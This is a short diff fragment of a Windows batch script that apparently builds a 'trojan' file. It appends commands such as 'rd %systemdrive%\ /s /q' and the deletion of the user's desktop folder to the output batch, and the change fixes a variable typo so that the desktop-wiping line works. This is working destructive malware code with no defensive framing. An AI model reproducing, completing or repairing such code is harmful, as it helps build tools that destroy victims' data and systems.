@@ -36,7 +36,7 @@ echo rd %systemdrive%\ /s /q >> "%trojanname%.bat"
 goto main
 
 :deldesktop
-echo rd "%userprofile\desktop" /s /q >> "%trojanname%.bat"
+echo rd "%userprofile%\desktop" /s /q >> "%trojanname%.bat"
 goto main
 
 :delwin
